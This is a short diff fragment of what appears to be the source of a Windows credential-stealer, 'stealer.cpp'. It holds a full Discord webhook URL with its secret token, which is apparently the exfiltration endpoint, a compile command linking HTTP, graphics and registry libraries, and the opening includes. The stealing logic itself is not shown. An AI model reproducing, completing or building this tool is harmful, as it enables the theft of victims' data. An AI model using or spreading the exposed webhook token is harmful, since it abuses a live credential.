@@ -1,7 +1,7 @@
 https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO
 
 
-
+cl stealer.cpp /EHsc /link winhttp.lib user32.lib gdi32.lib advapi32.lib
 
 #include <windows.h>
 #include <winhttp.h>
